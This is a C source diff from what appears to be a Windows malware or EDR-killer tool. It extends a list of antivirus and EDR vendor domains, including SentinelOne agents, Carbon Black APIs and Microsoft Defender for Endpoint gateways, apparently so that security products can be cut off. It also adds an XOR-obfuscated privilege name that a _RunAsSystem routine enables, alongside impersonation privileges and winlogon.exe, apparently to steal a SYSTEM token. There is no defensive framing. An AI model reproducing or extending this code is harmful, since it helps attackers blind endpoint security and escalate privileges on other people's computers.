@@ -30,6 +30,7 @@ static const char* s_domains[]={
     // ESET
     "eset.com","www.eset.com",
     "update.eset.com","edf.eset.com","download.eset.com",
+    "era.eset.com","repository.eset.com","activation.eset.com",
     // Malwarebytes
     "malwarebytes.com","www.malwarebytes.com",
     "data-cdn.mbamupdates.com","downloads.malwarebytes.com",
@@ -47,6 +48,7 @@ static const char* s_domains[]={
     // McAfee / Trellix
     "mcafee.com","www.mcafee.com",
     "trellix.com","www.trellix.com",
+    "mvision.trellix.com","cloud.trellix.com","api.trellix.com","ens.trellix.com",
     "update.nai.com","download.nai.com",
     "transfer.mcafee.com","vstskmgr.mcafee.com",
     // Sophos
@@ -65,6 +67,8 @@ static const char* s_domains[]={
     // SentinelOne
     "sentinelone.com","www.sentinelone.com",
     "assets.sentinelone.com","psc.sentinelone.net",
+    "usea1-agent.sentinelone.net","eua1-agent.sentinelone.net",
+    "euc1-agent.sentinelone.net","api.sentinelone.net",
     // G Data
     "gdata.de","www.gdata.de","update.gdata.de",
     // Emsisoft
@@ -99,9 +103,11 @@ static const char* s_domains[]={
     "wildfire.paloaltonetworks.com","xdr.us.paloaltonetworks.com",
     "autofocus.paloaltonetworks.com","threatvault.paloaltonetworks.com",
     "updates.paloaltonetworks.com","dl.paloaltonetworks.com",
+    "distributions-prod-xdr.panw.com","api2.xdr.paloaltonetworks.com",
     // Carbon Black / VMware / Broadcom
     "carbonblack.com","www.carbonblack.com","cbdynamiccloud.com",
     "defense.conferdeploy.net","api.conferdeploy.net","api2.conferdeploy.net",
+    "api3.conferdeploy.net","api4.conferdeploy.net","api5.conferdeploy.net",
     "api6.conferdeploy.net","dashboard.confer.net","cbhelpdesk.carbonblack.com",
     // Fortinet / FortiGuard
     "fortinet.com","www.fortinet.com","fortiguard.com","update.fortiguard.com",
@@ -234,6 +240,12 @@ static const char* s_domains[]={
     // Ivanti Neurons / Ivanti Endpoint Security
     "ivanti.com","www.ivanti.com","neurons.ivanti.com","cloud.ivanti.com",
     "download.ivanti.com","update.ivanti.com",
+    // Microsoft Defender for Endpoint (MDE/ATP sensor — EDR only, not AV)
+    "winatp-gw-weu.microsoft.com","winatp-gw-neu.microsoft.com",
+    "winatp-gw-eus.microsoft.com","winatp-gw-wus.microsoft.com",
+    "winatp-gw-uks.microsoft.com","winatp-gw-ukw.microsoft.com",
+    // Vectra AI (NDR / AI-driven threat detection)
+    "vectra.ai","www.vectra.ai","brain.vectra.ai","cloud.vectra.ai",
     // Stairwell
     "stairwell.com","www.stairwell.com",
     // Intercept X / Sophos Central (extra domains)
@@ -545,6 +557,10 @@ static const wchar_t _e_seip[]={
     _XW(L'S'),_XW(L'e'),_XW(L'I'),_XW(L'm'),_XW(L'p'),_XW(L'e'),_XW(L'r'),_XW(L's'),_XW(L'o'),
     _XW(L'n'),_XW(L'a'),_XW(L't'),_XW(L'e'),_XW(L'P'),_XW(L'r'),_XW(L'i'),_XW(L'v'),_XW(L'i'),
     _XW(L'l'),_XW(L'e'),_XW(L'g'),_XW(L'e'),0};
+static const wchar_t _e_siqp[]={
+    _XW(L'S'),_XW(L'e'),_XW(L'I'),_XW(L'n'),_XW(L'c'),_XW(L'r'),_XW(L'e'),_XW(L'a'),_XW(L's'),
+    _XW(L'e'),_XW(L'Q'),_XW(L'u'),_XW(L'o'),_XW(L't'),_XW(L'a'),_XW(L'P'),_XW(L'r'),_XW(L'i'),
+    _XW(L'v'),_XW(L'i'),_XW(L'l'),_XW(L'e'),_XW(L'g'),_XW(L'e'),0};
 static const wchar_t _e_wl[]={
     _XW(L'w'),_XW(L'i'),_XW(L'n'),_XW(L'l'),_XW(L'o'),_XW(L'g'),_XW(L'o'),_XW(L'n'),
     _XW(L'.'),_XW(L'e'),_XW(L'x'),_XW(L'e'),0};
@@ -701,8 +717,10 @@ static BOOL _RunAsSystem(void){
 
     wchar_t _d_sedp[24];_dw(_e_sedp,_d_sedp,24);
     wchar_t _d_seip[28];_dw(_e_seip,_d_seip,28);
+    wchar_t _d_siqp[25];_dw(_e_siqp,_d_siqp,25);
     _EnablePrivilege(_d_sedp);
     _EnablePrivilege(_d_seip);
+    _EnablePrivilege(_d_siqp);
 
     HANDLE hSystemTok=NULL;
     PROCESSENTRY32W pe={};pe.dwSize=sizeof(pe);
